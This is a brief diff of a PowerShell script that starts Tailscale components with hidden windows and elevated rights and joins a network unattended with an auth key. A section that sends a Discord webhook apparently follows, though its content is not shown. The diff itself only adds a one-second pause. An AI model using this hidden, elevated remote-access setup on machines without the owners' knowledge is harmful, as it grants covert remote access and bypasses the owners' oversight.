@@ -81,6 +81,7 @@ Start-Process -FilePath "C:\Tailscale\tailscaled.exe" -windowstyle hidden -Verb 
 Start-Process -FilePath "C:\Tailscale\tailscale-ipn.exe" -windowstyle hidden -Verb RunAs 
 Start-Sleep 1
 Start-Process -FilePath "C:\Tailscale\tailscale.exe" -windowstyle hidden -Verb RunAs -ArgumentList "up --authkey $authKey --unattended"
+Start-Sleep 1
 
 ## Sends Discord Webhook
 
